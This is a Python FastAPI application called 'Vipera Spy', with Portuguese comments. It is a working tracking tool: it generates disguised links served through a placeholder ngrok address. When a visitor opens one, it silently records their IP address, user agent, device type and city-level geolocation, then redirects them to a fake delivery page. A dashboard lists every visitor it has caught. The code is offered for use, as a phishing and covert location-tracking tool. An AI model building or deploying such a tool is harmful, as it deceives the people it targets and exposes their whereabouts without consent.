from fastapi import FastAPI, Request, Form, Depends
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy import create_engine, Column, Integer, String, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker
from datetime import datetime
import os
import httpx
import uvicorn

app = FastAPI(title="Vipera Spy")
templates = Jinja2Templates(directory="templates")

# Banco de dados
engine = create_engine("sqlite:///vipera.db", echo=False)
Base = declarative_base()

class Track(Base):
    __tablename__ = "tracks"
    id = Column(Integer, primary_key=True, index=True)
    link_id = Column(String, index=True)
    ip = Column(String)
    user_agent = Column(String)
    location = Column(String)
    device = Column(String)
    timestamp = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(bind=engine)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

def get_location(ip: str):
    try:
        r = httpx.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}"
    except:
        pass
    return "Indisponível"

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/create-link")
async def create_link(title: str = Form(...), fake_type: str = Form("delivery")):
    link_id = os.urandom(8).hex()
    full_link = f"http://SEU-NGROK:8000/track/{link_id}"
    return {"success": True, "link": full_link, "id": link_id}

@app.get("/track/{link_id}")
async def track(request: Request, link_id: str, db=Depends(get_db)):
    ip = request.client.host
    ua = request.headers.get("user-agent", "Unknown")
    location = get_location(ip)
    device = "Mobile" if any(x in ua.lower() for x in ["android", "iphone", "mobile"]) else "Desktop"

    track_entry = Track(link_id=link_id, ip=ip, user_agent=ua, location=location, device=device)
    db.add(track_entry)
    db.commit()
    return RedirectResponse(url="/fake-delivery", status_code=302)

@app.get("/fake-delivery", response_class=HTMLResponse)
async def fake_delivery(request: Request):
    return templates.TemplateResponse("fake.html", {"request": request})

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request, db=Depends(get_db)):
    tracks = db.query(Track).order_by(Track.timestamp.desc()).all()
    return templates.TemplateResponse("dashboard.html", {"request": request, "tracks": tracks})

if __name__ == "__main__":
    print("🚀 Vipera Spy rodando em http://0.0.0.0:8000")
    print("📊 Dashboard: http://0.0.0.0:8000/dashboard")
    uvicorn.run("main:app", host="0.0.0.0", port=8000)